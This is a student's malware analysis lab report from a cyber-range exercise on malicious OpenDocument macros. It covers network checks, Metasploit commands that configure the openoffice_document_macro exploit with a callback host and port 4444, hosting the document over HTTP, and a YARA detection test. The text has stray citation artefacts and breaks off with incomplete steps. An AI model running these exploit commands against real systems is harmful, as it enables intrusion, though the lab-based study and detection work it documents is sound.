# Week 10 – CTF Cyber Range: Malicious Macros (Detection & Evidence Collection)

**Student:** Raoul  
**Date:** 2025-09-16  
**Lab:** CTF Cyber Range – Malicious Macros: Detection & Evidence Collection  
**Course:** ITSC 303 – Malware Analysis (SAIT)  

## Summary

In this lab I simulated a malicious OpenDocument Text (ODT) macro attack in a safe, controlled cyber-range. I played both roles: an attacker hosting a macro-enabled ODT over HTTP and a defender capturing network traffic, collecting host artefacts, extracting the macro code, and building a custom YARA rule. No real malware was executed; all payloads were benign and the focus was on documenting evidence and detection techniques. :contentReference[oaicite:0]{index=0}  

## Environment

- **Attacker (Kali / ATK)** – `10.0.0.23`  
  - `python3 -m http.server 8888` (HTTP hosting)  
  - `tcpdump` for packet capture  
  - LibreOffice (headless) for ODT handling  
  - `yara` for rule testing  

- **Target (Windows VM)** – `10.0.0.53`  
  - PowerShell as normal user  
  - Evidence saved under `Desktop\Nexova_Evidence`  

- **Safety controls**  
  - Only benign ODT and scripts used  
  - No real reverse shells or malicious payloads executed  

## Objectives

1. Document attacker and victim network configuration.  
2. Identify OpenOffice/ODT-related modules in Metasploit.  
3. Generate and host an ODT with embedded macro code (training module only).  
4. Capture HTTP delivery of the ODT and tie it to the target IP.  
5. Extract and review macro source from the ODT container.  
6. Create and test a YARA rule to detect the macro pattern.  
7. Produce a forensically sound report with screenshots and narrative.

## Steps

### 1. Network verification (dual-screen evidence)

- On **Kali**, ran `ip addr` to confirm the attacker IP `10.0.0.23`.  
- On **Windows**, ran `ipconfig` to confirm the target IP `10.0.0.53`.  
- Screenshot shows both outputs side by side as proof that connectivity is correctly configured for the exercise. :contentReference[oaicite:1]{index=1}  

### 2. Metasploit reconnaissance

- Started `msfconsole` and searched for OpenOffice-related modules:

  ```text
  msf6 > search openoffice document

### 3. Selected the openoffice_document_macro module and configured the basic options:

msf6 > use exploit/multi/misc/openoffice_document_macro
msf6 exploit(openoffice_document_macro) > set LHOST 10.0.0.23
msf6 exploit(openoffice_document_macro) > set LPORT 4444
msf6 exploit(openoffice_document_macro) > run -j

### 4. From ~/.msf4/local on Kali, started a simple HTTP server:

python3 -m http.server 8888

### 5. Tested it with:

yara odt_macro_malicious.yar msf.odt
